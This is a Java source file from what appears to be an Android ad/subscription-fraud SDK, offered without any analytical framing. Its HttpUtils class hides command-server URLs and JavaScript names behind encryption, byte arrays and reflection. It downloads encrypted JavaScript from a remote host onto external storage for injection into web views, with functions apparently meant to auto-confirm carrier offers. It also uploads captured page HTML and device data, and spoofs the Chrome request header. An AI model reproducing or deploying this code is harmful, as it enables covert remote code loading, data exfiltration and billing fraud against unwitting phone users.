package mklw.aot.zxjn.u;

import android.content.Context;
import android.os.Environment;
import android.text.TextUtils;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.GZIPOutputStream;

import static mklw.aot.zxjn.u.OtherUtils.getURLConnection;


/**
 * Created by xlc on 2017/5/24.
 */

public class HttpUtils {

    public static final String js_get_source = "javascript:window.myObj.getSource(document.getElementsByTagName('html')[0].innerHTML);";

    //javascript:
    public static final String Java_js = "OWMFstzfnPQhJG7nH7o/tw==";
    //javascript:findLp(
    public static final String Java_js_lp = "D2qJuNEHTQ3O4d04PKxpT8peI5MThfWOvW00bTSYtQk=";
    //javascript:findAocOk()
    public static final String Java_js_aoc = "OYiiTEvBhFTSSKYcqy637U0Kyp+7LUDJH6SDLznSuQY=";
    //javascript:
    public static final byte[] JAVA_BYTE_JS = new byte[]{106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 58};
    //javascript:findLp(
    public static final byte[] JAVA_BYTE_JS_LP = new byte[]{106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 58, 102, 105, 110, 100, 76, 112, 40};
    //javascript:findAocOk()
    public static final byte[] JAVA_BYTE_JS_AOC = new byte[]{106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 58, 102, 105, 110, 100, 65, 111, 99, 79, 107, 40, 41};

    // encode.js
    private static String FileName = "aFZhZBChelLT8iCd42YLmg==";
    //.subscribe
    private static String FileList = "EBvMsJYPmPkMFwlY7SV3Ng==";
    //.subscribe/encode.js
    private static final String jsName = "9gPKm2k7vPlwIKGykIfMionJ3bwyLyEmkojSywhzoiY=";

    //http://sp.adpushonline.com:7088/sdk_p/a
    public static final String URL_Cache = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1plqWZ8tiRaEafq53nLBO1l";
    //http://sp.adpushonline.com:7088/sdk_p/b
    public static final String URL_Connect = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1pkzp9kVDmLS7Uq3DzqnhjT";
    //http://sp.adpushonline.com:7088/sdk_p/c
    public static final String URL_Source = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1qnJksyJAVV95v0b4W+KwjJ";
    //http://sp.adpushonline.com:7088/sdk_p/d
    public static final String URL_DownJS = "rBczGWZYTbCzdA7hBqp88zEJ3Fi92VYfsdG/RdxQa1r6rh83P8Z66x5IxVBBN5tx";

    //    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    public static ExecutorService executorService = Executors.newScheduledThreadPool(20);

    /**
     * 联网
     *
     * @param objectMap
     * @param context
     */
    public static synchronized void connect(Map<String, Object> objectMap, Context context) {
        String encodeString = EncodeUtils.enCrypt(new JSONObject(objectMap).toString(), JsUtil.getInstance(context).getJs_key());
        if (!TextUtils.isEmpty(encodeString)) {
            PrintWriter out = null;
            try {

                URLConnection myConnect = getURLConnection(EncodeUtils.deCrypt(URL_Connect, EncodeUtils.keyBytes));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encodeString);
                out.flush();

                if (isSuccessful(myConnect)) {
                    Ulog.show("c success");
                    //  // Ulog.w("联网: 成功！");
                }
            } catch (Exception e) {
                // LogUtil.show("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            } finally {
                try {
                    if (out != null) {
                        out.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * 下载
     *
     * @param context
     * @return
     */
    public static boolean post_download_js(Context context) {
        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInforUtils.getMcc(context));
        JSONObject jsonObject = new JSONObject(map);

        String encode = EncodeUtils.enCrypt(jsonObject.toString(), JsUtil.getInstance(context).getJs_key());

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeUtils.deCrypt(FileList, EncodeUtils.keyBytes));
        if (!file.exists()) {
            file.mkdirs();
        }

        file = new File(file.getPath(), EncodeUtils.deCrypt(FileName, EncodeUtils.keyBytes));

        // Ulog.w("post_test: encode" + encode);

        if (!TextUtils.isEmpty(encode)) {
            PrintWriter out = null;
            //  GZIPInputStream zipInput = null;
            Object zipInput = null;

            FileOutputStream fileOutput = null;

            try {
                URLConnection urlConnect = getURLConnection(EncodeUtils.deCrypt(URL_DownJS, EncodeUtils.keyBytes));
                out = new PrintWriter(urlConnect.getOutputStream());
                out.print(encode);
                out.flush();

                if (isSuccessful(urlConnect)) {
                    //GZIPInputStream
                    String str = new String(new byte[]{71, 90, 73, 80, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109});
                    Class cls = Class.forName("java.util.zip." + str);
                    zipInput = cls.getConstructor(InputStream.class).newInstance(urlConnect.getInputStream());
                    // zipInput = new GZIPInputStream(urlConnect.getInputStream());


                    fileOutput = new FileOutputStream(file);
                    byte[] buffer = new byte[2048];
                    int n;
                    //  while ((n = zipInput.read(buffer)) >= 0) {
                    while ((n = getDexRead(zipInput, buffer)) >= 0) {
                        fileOutput.write(buffer, 0, n);
                    }
                    Ulog.show("j success");
                }

                JsUtil.getInstance(context).save_download_js_time();

                return true;

            } catch (Exception e) {
                e.printStackTrace();

                if (file.exists()) {
                    file.delete();
                }

            } finally {
                try {
                    if (fileOutput != null) {
                        fileOutput.close();
                    }
                    if (zipInput != null) {
                        //  zipInput.close();
                        zipInput.getClass().getMethod("close").invoke(zipInput);
                    }
                    if (out != null) {
                        out.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        return false;
    }

    private static int getDexRead(Object obj, byte[] org) throws Exception {
        //        zipInput.read(buffer)
        return (int) obj.getClass().getMethod("read", byte[].class).invoke(obj, org);
    }

    /**
     * 直接读取加密的JS文件
     */
    public static String get_encode_js(Context context) {
        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, EncodeUtils.deCrypt(jsName, EncodeUtils.keyBytes));
        if (!file.exists()) {
            return null;
        }

        FileInputStream fileInputStream = null;
        ByteArrayOutputStream out = null;
        try {
            fileInputStream = new FileInputStream(file);
            out = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int n;
            while ((n = fileInputStream.read(buffer)) >= 0) {
                out.write(buffer, 0, n);
            }

            //解密
            String decode_js_source = EncodeUtils.deCrypt(out.toString(), JsUtil.getInstance(context).getJs_key());
            //读取解密后的JS
            //  Ulog.w("post_read_encode_js: 解密后的JS为：" + decode_js_source);
            return decode_js_source;
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (fileInputStream != null) {
                    fileInputStream.close();
                }
                if (out != null) {
                    out.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    /**
     * 获取Offer
     */
    public static String getCaseData(Context context, Map<String, Object> objectMap) {
        String offer_decode = null;
        JSONObject jsonObject = new JSONObject(objectMap);
        String jsonString = jsonObject.toString();
        String encode = EncodeUtils.enCrypt(jsonString, JsUtil.getInstance(context).getJs_key());

        //        Ulog.show("post_test: encode:" + encode);

        if (!TextUtils.isEmpty(encode)) {
            PrintWriter out = null;
            InputStream input = null;
            try {

                URLConnection myConnect = getURLConnection(EncodeUtils.deCrypt(URL_Cache, EncodeUtils.keyBytes));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(encode);
                out.flush();

                if (isSuccessful(myConnect)) {
                    input = myConnect.getInputStream();
                    StringBuilder strDate = new StringBuilder();
                    byte[] br = new byte[1024];

                    int len = -1;
                    while ((len = input.read(br)) >= 0) {
                        strDate.append(new String(br).substring(0, len));
                    }

                    offer_decode = EncodeUtils.deCrypt(strDate.toString(), JsUtil.getInstance(context).getJs_key());
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (input != null) {
                        input.close();
                    }

                    if (out != null) {
                        out.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return offer_decode;
    }

    /**
     * 用okhttp 回传源码信息
     *
     * @param message
     */
    public static void postSource(Map<String, Object> message, Context context) {
        String offer_id = message.get("offer_id").toString();
        JSONObject jsonObject = new JSONObject(message);
        String jsonString = jsonObject.toString();

        // Ulog.w("postSource:源码总长 " + jsonString.length());

        ByteArrayOutputStream arr = null;
        OutputStream zipper = null;
        PrintWriter out = null;

        //加密
        try {

            String encode = EncodeUtils.enCrypt(jsonString, JsUtil.getInstance(context).getJs_key());

            if (!TextUtils.isEmpty(encode)) {

                byte[] data = encode.getBytes("UTF-8");
                arr = new ByteArrayOutputStream();
                zipper = new GZIPOutputStream(arr);

                zipper.write(data);
                zipper.close();

                URLConnection myConnect = getURLConnection(EncodeUtils.deCrypt(URL_Source, EncodeUtils.keyBytes));

                out = new PrintWriter(myConnect.getOutputStream());
                out.print(arr.toByteArray());
                out.flush();

                if (isSuccessful(myConnect)) {
                    XmlShareUtils.save(context, offer_id, 1);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            //   Ulog.show("postSource: fail:" + e.getMessage());
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (arr != null) {
                    arr.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //X-Requested-With
    public static final String HeadKey = "1/dbJVQWYv4PDw+zrdYUrl3tLfOw1dkU7Zm1unBcbFE=";
    //com.android.chrome
    public static final String HeadValue = "eUMSys/9KSx8Uw0KFAx1KTszIgpbHcyUWJRK5DOZT7c=";

    public static Map<String, String> getWebHead() {
        Map<String, String> header = new HashMap<>();
        header.put(EncodeUtils.deCrypt(HeadKey), EncodeUtils.deCrypt(HeadValue));//默认是应用包名
        return header;
    }

    private static boolean isSuccessful(URLConnection urlConnect) throws IOException {
        int code = ((HttpURLConnection) urlConnect).getResponseCode();
        if (code >= 200 && code < 300) {
            return true;
        }
        return false;
    }
}